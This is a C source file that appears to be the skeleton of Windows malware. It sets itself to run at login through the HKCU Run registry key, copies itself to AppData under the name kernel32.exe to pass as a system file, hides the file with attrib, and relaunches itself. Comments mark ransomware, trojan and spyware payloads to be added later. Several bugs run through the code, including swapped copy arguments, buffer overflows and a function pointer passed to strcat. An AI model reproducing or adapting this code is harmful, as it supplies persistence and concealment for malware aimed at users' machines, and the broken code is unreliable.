#include <Windows.h>
#include <stdio.h>

#define SUCCESS         0
#define ACCESS_DENAIED -1
#define ERR_IN_PROCESS  1

#define NEW_PATH        "%%APPDATA%%\\kernel32.exe"
#define REG_NAME        "kernel32"

char *getPath();
int  autorun(char*);
int  autoRun();
void autoRunFix();
BOOL Copy(char*, char*);
void restart();
void setup();

int main(int argc, char **argv) {
    if(argc != 2 && strcmp(argv[1], "d") == 0)
        setup();
    // process
    // ransomware
    // malware
    // trojan
    // adware
    // spyware
    // ...
    return 0;
}

char *getPath() {
    char *PATH = (char*)malloc(MAX_PATH);
    GetModuleFileName(NULL, PATH, MAX_PATH);
    return PATH;
}

int autorun(char *sh) {
    HKEY hKey = NULL;
    LONG LRet = RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if(LRet != ERROR_SUCCESS)
        return LRet;
    LRet = RegSetValueEx(hKey, REG_NAME, 0, REG_SZ, (LPBYTE)sh, strlen(sh)+1);
    RegCloseKey(hKey);
    free(sh);
    return LRet;
}

int autoRun() {
	/* auto run script */
    // HKEY_CURRENT_USER
    char shell[] = "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v \""REG_NAME"\" /t REG_SZ /d \"";
    strcat(shell, getPath());
    strcat(shell, " d\""); // argc=2
    // Run & Handle
    FILE* fp = _popen(shell, "r");
    if (fp == NULL)
        // error with opening file
        return ERR_IN_PROCESS;

    char buffer[50];
    fgets(buffer, 50, fp);
    _pclose(fp);
    if (strstr(buffer, "successfuly"))
        // Done!
        return SUCCESS;
    else
        /* ACCESS DENAIED! */
        return ACCESS_DENAIED;
}

void autoRunFix() {
    //
}

BOOL Copy(char* src, char* dst) {
    FILE *in  = fopen(dst, "rb");
    FILE *out = fopen(src, "wb");

    if(in == NULL || out == NULL)
        return -1;

    char ch;
    while ((ch=getc(in)) != EOF)
        fputc(ch, out);
    fclose(in);
    fclose(out);
    return 0;
}

void restart() {
    FILE *bat = fopen("script.bat", "w");
    fprintf(bat, "timeout /t 3\n.\\kernel32.exe");
    fclose(bat);
    system("start 'kernel32.exe d'");
    exit(EXIT_SUCCESS);
}

void setup() {
    char *sh = "%%APPDATA%%\\kernel32.exe d";
    if(autorun(sh) != SUCCESS)
        // fix the problem
        if(autoRun() != SUCCESS) autoRunFix();
    // Next process
    // copy & paste
    BOOL ret;
    if(fopen("%%APPDATA%%\\kernel32.exe", "r") == NULL)
        ret = Copy(getPath(), NEW_PATH);
    if(ret != SUCCESS) {
        char *shell = getPath();
        strcat(shell, " d");
        if(autorun(shell) != SUCCESS)
            // fix the problem
            if(autoRun() != SUCCESS) autoRunFix();
    }
    // attrib
    char attr[] = "attrib +H +S +R ";
    strcat(attr, getPath);
    system(attr);
    // restart and go to the next part
    restart();
}